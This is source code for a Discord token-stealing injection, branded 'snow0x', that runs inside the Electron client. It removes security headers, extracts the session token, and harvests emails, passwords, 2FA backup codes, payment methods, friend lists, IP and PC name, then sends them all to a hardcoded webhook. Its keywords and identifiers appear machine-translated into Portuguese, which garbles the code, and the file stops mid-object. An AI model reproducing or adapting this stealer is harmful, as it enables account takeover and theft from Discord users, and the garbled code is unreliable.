const fs = require('fs');
const caminho = require('caminho');
const {
	Janela do navegador,
	sessão
} = require('elétron')
const querystring = require('querystring');
const os = require('os')
var webhook = "https://discord.com/api/webhooks/933161967114395728/H-XltoXiOudakNLRe6_nCpjRVFuw8AvG3UJ83Dp0ZmtuWkDxP6qOAo8Uy2DVo6rWCmmX";
var delayInMilliseconds = 1000
const computerName = os.hostname();
const discordInstall = `${__dirname}`
const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require" ]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]) ,gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"= =a&&(token=b.default.getToken())}token;`
 
String.prototype.insert = function (índice, string) {
	if (índice > 0) {
		return this.substr(0, index) + string + this.substr(index);
	}
 
	string de retorno + isso;
};
 
configuração const = {
    "logout": "instantâneo",
    "logout-notify": "true",
    "init-notify":"true",
    "incorporar-cor": 3447704,
    "disable-qr-code":"true"
}
 
session.defaultSession.webRequest.onHeadersReceived((detalhes, retorno de chamada) => {
	if (details.url.startsWith(webhook)) {
		if (details.url.includes("discord.com")) {
			ligar de volta({
				responseHeaders: Object.assign({
					'Acess-Control-Allow-Headers': "*"
				}, detalhes.respostaHeaders)
			});
		} senão {
			ligar de volta({
				responseHeaders: Object.assign({
					"Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
					'Acess-Control-Allow-Headers': "*",
					"Acesso-Controle-Permitir-Origem": "*"
				}, detalhes.respostaHeaders)
			});
		}
 
 
	} senão {
		delete details.responseHeaders['content-security-policy'];
		delete details.responseHeaders['content-security-policy-report-only'];
 
		ligar de volta({
			responseHeaders: {
				...detalhes.respostaCabeçalhos,
				'Acess-Control-Allow-Headers': "*"
			}
		})
	}
 
})
 
 
 
 
function Primeira Vez() {
	const janela = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
		if (config['init-notify'] == "true") {
			if (fs.existsSync(path.join(__dirname, "init"))) {
				fs.rmdirSync(path.join(__dirname, "init"));
				if (token == null || token == indefinido || token == "") {
					var c = {
						nome de usuário: "snow0x",
						contente: "",
						incorpora: [{
							title: "Discord inicializado (usuário não logado)",
							color: config["incorporar-cor"],
							Campos: [{
								nome: "Injeção de malware",
								valor: `\`\`\`Informações de injeção: \n${__dirname}\n\`\`\``,
								em linha: !1
							}],
							autor: {
								nome: "neve0x"
							},
							rodapé: {
								texto: "neve0x"
							}
						}]
					};
					SendToWebhook(JSON.stringify(c));
				} senão {
					const janela = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token} "),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						const b = JSON.parse(a);
						var c = {
							nome de usuário: "snow0x",
							contente: "",
							incorpora: [{
								título: "Discord Inicializado",
								description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
								color: config["incorporar-cor"],
								Campos: [{
									nome: "Injeção de malware",
									valor: `\`\`\`Informações de injeção: \n${__dirname}\n\`\`\``,
									em linha: !1
								}, {
									nome: "IP",
									valor: `\`${ip}\``,
									em linha: !0
								}, {
									nome: "Nome do PC",
									valor: `\`${computerName}\``,
									em linha: !0
								}, {
									nome: "Nome de usuário",
									valor: `\`${b.username}#${b.discriminator}\``,
									em linha: !0
								}, {
									nome: "ID",
									valor: `\`${b.id}\``,
									em linha: !0
								}, {
									crachás",
									valor: `${GetBadges(b.flags)}`,
									em linha: !1
								}, {
									nome: "Token",
									valor: `\`\`\`${token}\`\`\``,
									em linha: !1
								}],
								autor: {
									nome: "neve0x"
								},
								rodapé: {
									texto: "neve0x"
								},
								miniatura: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						SendToWebhook(JSON.stringify(c))
					});
				}
 
			}
		}
		if (!fs.existsSync(path.join(__dirname, "snow0x"))) {
			retorne !0
		}
		fs.rmdirSync(path.join(__dirname, "snow0x"));
		if (config.logout != "false" || config.logout == "%LOGOUT%") {
			if (config['logout-notify'] == "true") {
				if (token == null || token == indefinido || token == "") {
					var c = {
						nome de usuário: "snow0x",
						contente: "",
						incorpora: [{
							title: "Logout do usuário (Usuário não logado antes)",
							color: config["incorporar-cor"],
							Campos: [{
								nome: "Injeção de malware",
								valor: `\`\`\`Informações de injeção: \n${__dirname}\n\`\`\``,
								em linha: !1
							}],
							autor: {
								nome: "neve0x"
							},
							rodapé: {
								texto: "neve0x"
							}
						}]
					};
					SendToWebhook(JSON.stringify(c));
				} senão {
					const janela = BrowserWindow.getAllWindows()[0];
					window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token} "),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
						const b = JSON.parse(a);
						var c = {
							nome de usuário: "snow0x",
							contente: "",
							incorpora: [{
								title: "Usuário foi desconectado",
								description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
								color: config["incorporar-cor"],
								Campos: [{
									nome: "Injeção de malware",
									valor: `\`\`\`Informações de injeção: \n${__dirname}\n\`\`\``,
									em linha: !1
								}, {
									nome: "Nome de usuário",
									valor: `\`${b.username}#${b.discriminator}\``,
									em linha: !0
								}, {
									nome: "ID",
									valor: `\`${b.id}\``,
									em linha: !0
								}, {
									crachás",
									valor: `${GetBadges(b.flags)}`,
									em linha: !1
								}, {
									nome: "Token",
									valor: `\`\`\`${token}\`\`\``,
									em linha: !1
								}],
								autor: {
									nome: "neve0x"
								},
								rodapé: {
									texto: "neve0x"
								},
								miniatura: {
									url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
								}
							}]
						};
						SendToWebhook(JSON.stringify(c))
					});
				}
			}
			const janela = BrowserWindow.getAllWindows()[0];
			window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]] ]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg .c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a (d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
		}
		retorne !1
	}))
}
filtro const = {
	"urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable" , "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord .com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com /api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (detalhes, callback) => {
	if (details.url.startsWith("wss://")) {
		if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
			ligar de volta({
				cancelar: verdadeiro
			})
			Retorna;
		}
	}
	if (FirstTime()) {}
 
	ligar de volta({})
	Retorna;
})
 
function SendToWebhook(o que) {
    const janela = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(` var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://discord.com/api/webhooks/933161967114395728/H-XltoXiOudakNLRe6_nCpjRVFuw8AvG3UJ83Dp0ZmtuWkDxP6qOAo8Uy2DVo6rWCmmX", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Acesso-Controle-Permitir-Origem', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}));
    window.webContents.executeJavaScript(` var xhr = new XMLHttpRequest();
    xhr.open("POST", "${webhook}", true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('Acesso-Controle-Permitir-Origem', '*');
    xhr.send(JSON.stringify(${what}));
    `, !0).then((token => {}))
}
 
function GetNitro(sinalizadores) {
	if (sinalizadores == 0) {
		return "Nenhum Nitro na Conta"
	}
	if (sinalizadores == 1) {
		return "<:classic:896119171019067423> \`Nitro Classic\`"
	}
	if (sinalizadores == 2) {
		return "<a:boost:824036778570416129> \`Nitro Boost\`"
	} senão {
		return "Nenhum Nitro na Conta"
	}
}
 
function GetRBadges(sinalizadores) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var emblemas = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		emblemas += "<:staff:874750808728666152>"
	}
	if ((sinalizadores & Partnered_Server_Owner) == Partnered_Server_Owner) {
		emblemas += "<:parceiro:874750808678354964>"
	}
	if ((bandeiras & HypeSquad_Events) == HypeSquad_Events) {
		emblemas += "<:hypesquad_events:874750808594477056>"
	}
	if ((sinalizadores & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		emblemas += "<:bughunter_1:874750808426692658>"
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		emblemas += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		emblemas += "<:bughunter_2:874750808430874664>"
	}
	if ((sinalizadores & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		emblemas += "<:desenvolvedor:874750808472825986>"
	}
	if (emblemas == "") {
		emblemas = ""
	}
	crachás de devolução
}
 
function GetBadges(sinalizadores) {
	const Discord_Employee = 1;
	const Partnered_Server_Owner = 2;
	const HypeSquad_Events = 4;
	const Bug_Hunter_Level_1 = 8;
	const House_Bravery = 64;
	const Casa_Brilho = 128;
	const House_Balance = 256;
	const Early_Supporter = 512;
	const Bug_Hunter_Level_2 = 16384;
	const Early_Verified_Bot_Developer = 131072;
	var emblemas = "";
	if ((flags & Discord_Employee) == Discord_Employee) {
		emblemas += "<:staff:874750808728666152>"
	}
	if ((sinalizadores & Partnered_Server_Owner) == Partnered_Server_Owner) {
		emblemas += "<:parceiro:874750808678354964>"
	}
	if ((bandeiras & HypeSquad_Events) == HypeSquad_Events) {
		emblemas += "<:hypesquad_events:874750808594477056>"
	}
	if ((sinalizadores & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
		emblemas += "<:bughunter_1:874750808426692658>"
	}
	if ((bandeiras & House_Bravery) == House_Bravery) {
		emblemas += "<:bravura:874750808388952075>"
	}
	if ((bandeiras & House_Brilliance) == House_Brilliance) {
		emblemas += "<:brilho:874750808338608199> "
	}
	if ((flags & House_Balance) == House_Balance) {
		emblemas += "<:balance:874750808267292683>"
	}
	if ((flags & Early_Supporter) == Early_Supporter) {
		emblemas += "<:early_supporter:874750808414113823> "
	}
	if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
		emblemas += "<:bughunter_2:874750808430874664>"
	}
	if ((sinalizadores & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
		emblemas += "<:desenvolvedor:874750808472825986>"
	}
	if (emblemas == "") {
		badges = "Sem emblemas raros"
	}
	crachás de devolução
}
 
function Login(e-mail, senha, token) {
	const janela = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
 
					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("autorização", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((códigos) => {
 
							var campo = [];
							var baseuri = "https://furry.surf/raw/"
 
 
							var gayass = JSON.parse(codes)
 
							deixe g = gayass.backup_codes
							const r = g.filter((código) => {
								código de retorno.consumed == null
							})
							para (seja z em r) {
								fieldo.push({
									nome: `Código`,
									valor: `\`${r[z].code.insert(4, "-")}\``,
									em linha: verdadeiro
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}
 
							function totalAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
 
									return user.type == 1
								})
								retornar r.comprimento
							}
 
							function CalcAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
									return user.type == 1
								})
								var gay = "";
								para (z de r) {
									var b = GetRBadges(z.user.public_flags)
									if (b!= "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Sem amigos raros"
								}
								voltar gay
							}
 
							function legal() {
								const json = JSON.parse(info3)
								var faturamento = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`❌\`"
									} else if (z.type == 2 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " :credit_card:"
									} senão {
										return "\`❌\`"
									}
								})
								if (faturamento == "") {
									cobrança = "\`❌\`"
								}
								faturamento de retorno
							}
							const json = JSON.parse(info);
 
							var parametros = {
								nome de usuário: "snow0x",
								contente: "",
								incorpora: [{
									"title": "Login do usuário",
									description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
									"color": config['incorporar-cor'],
									"Campos": [{
										nome: "Injeção de malware",
										valor: `\`\`\`Informações de injeção: \n${discordInstall}\n\`\`\``,
										em linha: !1
									}, {
										nome: "IP",
										valor: `\`${ip}\``,
										em linha: !0
									}, {
										nome: "Nome do PC",
										valor: `\`${computerName}\``,
										em linha: !0
									}, {
										nome: "Nome de usuário",
										valor: `\`${json.username}#${json.discriminator}\``,
										em linha: !0
									}, {
										nome: "ID",
										valor: `\`${json.id}\``,
										em linha: !0
									}, {
										nome: "Nitro",
										valor: `${GetNitro(json.premium_type)}`,
										em linha: !1
									}, {
										crachás",
										valor: `${GetBadges(json.flags)}`,
										em linha: !1
									}, {
										nome: "Métodos de Pagamento",
										valor: `${Cool()}`,
										em linha: !1
									}, {
										nome: "E-mail",
										valor: `\`${email}\``,
										em linha: !0
									}, {
										nome: "Senha",
										valor: `\`${senha}\``,
										em linha: !0
									}, {
										nome: "Token",
										valor: `\`\`\`${token}\`\`\``,
										em linha: !1
									}, ],
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total de Amigos (${totalFriends()})`,
									"color": config['incorporar-cor'],
									"descrição": CalcAmigos(),
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Códigos 2FA](${baseuri})`,
								"color": config['incorporar-cor'],
								"campos": campo,
								"autor": {
									"nome": "neve0x"
								},
								"rodapé": {
									"texto": "neve0x"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}
 
							SendToWebhook(JSON.stringify(params))
 
						})
					} senão {
 
						const janela = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
										function totalAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											retornar r.comprimento
										}
 
										function CalcAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											var gay = "";
											para (z de r) {
												var b = GetRBadges(z.user.public_flags)
												if (b!= "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Sem amigos raros"
											}
											voltar gay
										}
 
										function legal() {
											const json = JSON.parse(info3)
											var faturamento = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " :credit_card:"
												} senão {
													return "\`❌\`"
												}
											})
											if (faturamento == "") {
												cobrança = "\`❌\`"
											}
											faturamento de retorno
										}
										const json = JSON.parse(info);
										var parametros = {
											nome de usuário: "snow0x",
											contente: "",
											incorpora: [{
												"title": "Login do usuário",
												description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
												"color": config['incorporar-cor'],
												"Campos": [{
													nome: "Injeção de malware",
													valor: `\`\`\`Informações de injeção: \n${discordInstall}\n\`\`\``,
													em linha: !1
												}, {
													nome: "IP",
													valor: `\`${ip}\``,
													em linha: !0
												}, {
													nome: "Nome do PC",
													valor: `\`${computerName}\``,
													em linha: !0
												}, {
													nome: "Nome de usuário",
													valor: `\`${json.username}#${json.discriminator}\``,
													em linha: !0
												}, {
													nome: "ID",
													valor: `\`${json.id}\``,
													em linha: !0
												}, {
													nome: "Nitro",
													valor: `${GetNitro(json.premium_type)}`,
													em linha: !1
												}, {
													crachás",
													valor: `${GetBadges(json.flags)}`,
													em linha: !1
												}, {
													nome: "Faturamento",
													valor: `${Cool()}`,
													em linha: !1
												}, {
													nome: "E-mail",
													valor: `\`${email}\``,
													em linha: !0
												}, {
													nome: "Senha",
													valor: `\`${senha}\``,
													em linha: !0
												}, {
													nome: "Token",
													valor: `\`\`\`${token}\`\`\``,
													em linha: !1
												}, ],
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total de Amigos (${totalFriends()})`,
												"color": config['incorporar-cor'],
												"descrição": CalcAmigos(),
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}]
										}
										SendToWebhook(JSON.stringify(params))
									})
								})
							})
						})
 
					}
				})
			})
		})
	})
}
 
function ChangePassword(senha antiga, nova senha, token) {
	const janela = BrowserWindow.getAllWindows()[0];
	window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
		window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
			window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
				window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
 
					if (token.startsWith("mfa")) {
						window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("autorização", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((códigos) => {
 
							var campo = [];
							var baseuri = "https://furry.surf/raw/"
 
 
							var gayass = JSON.parse(codes)
							deixe g = gayass.backup_codes
							const r = g.filter((código) => {
								código de retorno.consumed == null
							})
							para (seja z em r) {
								fieldo.push({
									nome: `Código`,
									valor: `\`${r[z].code.insert(4, "-")}\``,
									em linha: verdadeiro
								})
								baseuri += `${r[z].code.insert(4, "-")}<br>`
							}
 
							function totalAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
 
									return user.type == 1
								})
								retornar r.comprimento
							}
 
							function CalcAmigos() {
								var f = JSON.parse(info4)
								const r = f.filter((usuário) => {
									return user.type == 1
								})
								var gay = "";
								para (z de r) {
									var b = GetRBadges(z.user.public_flags)
									if (b!= "") {
										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
									}
								}
								if (gay == "") {
									gay = "Sem amigos raros"
								}
								voltar gay
							}
 
							function legal() {
								const json = JSON.parse(info3)
								var faturamento = "";
								json.forEach(z => {
									if (z.type == "") {
										return "\`❌\`"
									} else if (z.type == 2 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
									} else if (z.type == 1 && z.invalid != !0) {
										cobrança += "\`✔️\`" + " :credit_card:"
									} senão {
										return "\`❌\`"
									}
								})
								if (faturamento == "") {
									cobrança = "\`❌\`"
								}
								faturamento de retorno
							}
							const json = JSON.parse(info);
 
							var parametros = {
								nome de usuário: "snow0x",
								contente: "",
								incorpora: [{
									"title": "Senha alterada",
									description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
									"color": config['incorporar-cor'],
									"Campos": [{
										nome: "Injeção de malware",
										valor: `\`\`\`Informações de injeção: \n${discordInstall}\n\`\`\``,
										em linha: !1
									}, {
										nome: "IP",
										valor: `\`${ip}\``,
										em linha: !0
									}, {
										nome: "Nome do PC",
										valor: `\`${computerName}\``,
										em linha: !0
									}, {
										nome: "Nome de usuário",
										valor: `\`${json.username}#${json.discriminator}\``,
										em linha: !0
									}, {
										nome: "ID",
										valor: `\`${json.id}\``,
										em linha: !0
									}, {
										nome: "Nitro",
										valor: `${GetNitro(json.premium_type)}`,
										em linha: !1
									}, {
										crachás",
										valor: `${GetBadges(json.flags)}`,
										em linha: !1
									}, {
										nome: "Métodos de Pagamento",
										valor: `${Cool()}`,
										em linha: !1
									}, {
										nome: "E-mail",
										valor: `\`${json.email}\``,
										em linha: !1
									}, {
										nome: "Senha Antiga",
										valor: `\`${oldpassword}\``,
										em linha: !0
									}, {
										nome: "Nova Senha",
										valor: `\`${nova senha}\``,
										em linha: !0
									}, {
										nome: "Token",
										valor: `\`\`\`${token}\`\`\``,
										em linha: !1
									}, ],
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}, {
									"title": `Total de Amigos (${totalFriends()})`,
									"color": config['incorporar-cor'],
									"descrição": CalcAmigos(),
									"autor": {
										"nome": "neve0x"
									},
									"rodapé": {
										"texto": "neve0x"
									},
									"miniatura": {
										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
									}
								}]
							}
							var mfaembed = {
								"title": ":detective: __2FA Codes__",
								"description": `[Códigos 2FA](${baseuri})`,
								"color": config['incorporar-cor'],
								"campos": campo,
								"autor": {
									"nome": "neve0x"
								},
								"rodapé": {
									"texto": "neve0x"
								}
							}
							if (token.startsWith("mfa")) {
								params.embeds.push(mfaembed)
							}
 
							SendToWebhook(JSON.stringify(params))
 
						})
					} senão {
 
						const janela = BrowserWindow.getAllWindows()[0];
						window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Autorização", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
							window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
								window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Autorização", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
									window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Autorização", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
 
										function totalAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											retornar r.comprimento
										}
 
										function CalcAmigos() {
											var f = JSON.parse(info4)
											const r = f.filter((usuário) => {
												return user.type == 1
											})
											var gay = "";
											para (z de r) {
												var b = GetRBadges(z.user.public_flags)
												if (b!= "") {
													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
												}
											}
											if (gay == "") {
												gay = "Sem amigos raros"
											}
											voltar gay
										}
 
										function legal() {
											const json = JSON.parse(info3)
											var faturamento = "";
											json.forEach(z => {
												if (z.type == "") {
													return "\`❌\`"
												} else if (z.type == 2 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " <:paypal:896441236062347374>"
												} else if (z.type == 1 && z.invalid != !0) {
													cobrança += "\`✔️\`" + " :credit_card:"
												} senão {
													return "\`❌\`"
												}
											})
											if (faturamento == "") {
												cobrança = "\`❌\`"
											}
											faturamento de retorno
										}
										const json = JSON.parse(info);
										var parametros = {
											nome de usuário: "snow0x",
											contente: "",
											incorpora: [{
												"title": "Senha alterada",
												description: "[**<:partner:909102089513340979> │ snow0x Discord**](https://discord.gg/J4VTFKv37s)",
												"color": config['incorporar-cor'],
												"Campos": [{
													nome: "Injeção de malware",
													valor: `\`\`\`Informações de injeção: \n${discordInstall}\n\`\`\``,
													em linha: !1
												}, {
													nome: "IP",
													valor: `\`${ip}\``,
													em linha: !0
												}, {
													nome: "Nome do PC",
													valor: `\`${computerName}\``,
													em linha: !0
												}, {
													nome: "Nome de usuário",
													valor: `\`${json.username}#${json.discriminator}\``,
													em linha: !0
												}, {
													nome: "ID",
													valor: `\`${json.id}\``,
													em linha: !0
												}, {
													nome: "Nitro",
													valor: `${GetNitro(json.premium_type)}`,
													em linha: !1
												}, {
													crachás",
													valor: `${GetBadges(json.flags)}`,
													em linha: !1
												}, {
													nome: "Métodos de Pagamento",
													valor: `${Cool()}`,
													em linha: !1
												}, {
													nome: "E-mail",
													valor: `\`${json.email}\``,
													em linha: !1
												}, {
													nome: "Senha Antiga",
													valor: `\`${oldpassword}\``,
													em linha: !0
												}, {
													nome: "Nova Senha",
													valor: `\`${nova senha}\``,
													em linha: !0
												}, {
													nome: "Token",
													valor: `\`\`\`${token}\`\`\``,
													em linha: !1
												}, ],
												"autor": {
													"nome": "neve0x"
												},
												"rodapé": {
													"texto": "neve0x"
												},
												"miniatura": {
													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
												}
											}, {
												"title": `Total de Amigos (${totalFriends()})`,
												"color": config['incorporar-cor'],
